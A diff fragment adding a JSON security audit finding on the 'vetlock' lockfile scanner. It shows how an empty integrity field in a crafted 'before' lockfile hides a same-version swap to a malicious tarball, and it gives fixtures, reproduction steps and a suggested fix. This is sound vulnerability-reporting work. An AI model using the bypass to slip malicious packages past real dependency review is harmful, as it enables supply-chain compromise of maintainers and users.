+    "description": "packages/core/src/changeset.ts:54-56 requires `o.integrity !== n.integrity && n.integrity && o.integrity` — both sides truthy AND not equal. If EITHER side is empty string, no integrity-changed finding is emitted. The lockfile parser (lockfile.ts:98) sets `integrity: val.integrity ?? ''`. So a lockfile entry with the integrity key omitted has integrity `''`. Now: an attacker prepares a lockfile pair where the OLD lockfile is missing the integrity field for the target package (either because the attacker also authored the old lockfile, or because it's a v1 fragment / hand-edited). The NEW lockfile has full integrity. Same version string on both sides. Attacker's malicious tarball resolves fine against the new integrity. changeset: `integrity-changed` NOT emitted (old is empty). And with same version on both sides, the change is neither `added` nor `upgraded` (both entries exist under the same name@version) — so NO change record is emitted at all. Result: the malicious version is invisible to the entire pipeline, verdict CLEAN.",
+    "fixture_code": "# lockfile.before.json — attacker's crafted 'before' with no integrity for the target:\n{\n  \"name\": \"my-app\", \"version\": \"1.0.0\", \"lockfileVersion\": 3,\n  \"packages\": {\n    \"\": { \"name\": \"my-app\", \"version\": \"1.0.0\", \"dependencies\": { \"chalk\": \"^5.3.0\" } },\n    \"node_modules/chalk\": {\n      \"name\": \"chalk\",\n      \"version\": \"5.3.0\"\n      # deliberately missing `integrity` field\n    }\n  }\n}\n\n# lockfile.after.json — same version, full integrity:\n{\n  \"name\": \"my-app\", \"version\": \"1.0.0\", \"lockfileVersion\": 3,\n  \"packages\": {\n    \"\": { \"name\": \"my-app\", \"version\": \"1.0.0\", \"dependencies\": { \"chalk\": \"^5.3.0\" } },\n    \"node_modules/chalk\": {\n      \"name\": \"chalk\",\n      \"version\": \"5.3.0\",\n      \"integrity\": \"sha512-<attacker's malicious tarball's ssri>\",\n      \"resolved\": \"https://registry.npmjs.org/chalk/-/chalk-5.3.0-attacker.tgz\"\n    }\n  }\n}\n\n# computeChangeset:\n#   oldByNameVer has 'chalk@5.3.0' with integrity ''.\n#   newByNameVer has 'chalk@5.3.0' with integrity 'sha512-<evil>'.\n#   Line 55: `n.integrity !== o.integrity && n.integrity && o.integrity` → false (o.integrity is '').\n#   No integrity-changed emitted.\n#   Neither side has a version delta and both have entries under the same name → the version-\n#   upgrade / added / removed branches (lines 84-155) all skip.\n#   changes.length === 0. Engine reports 'CLEAN, 0 changed packages, 0 findings'.",
+    "reproduction_steps": [
+      "Author a `lockfile.before.json` that omits the `integrity` field for the target package (some tooling produces such lockfiles for local/workspace packages).",
+      "Author `lockfile.after.json` with the same name+version but with a new integrity pointing at your malicious tarball.",
+      "Run `vetlock diff before.json after.json`.",
+      "Engine emits zero changes and zero findings; verdict CLEAN despite a full tarball swap under the same version string."
+    ],
+    "detectors_bypassed": [
+      "integrity.hash-mismatch",
+      "every content-based detector (no snapshot fetched)"
+    ],
+    "severity_if_confirmed": "critical",
+    "confidence": "high",
+    "attacker_effort": "low — attacker controls the 'before' lockfile in any PR review scenario",
+    "fix_effort": "low",
+    "suggested_fix": "When an old-side or new-side integrity is empty string but the tarball is otherwise resolvable, treat the pair as `integrity-changed`/`integrity-missing` at BLOCK. Alternately: emit a synthetic INTEG/WARN 'integrity absent from before-lockfile' finding whenever a package's before-entry lacks an integrity field. The correct security posture is 'if we cannot prove the tarball is the same, we treat it as changed'."
+  }
+]
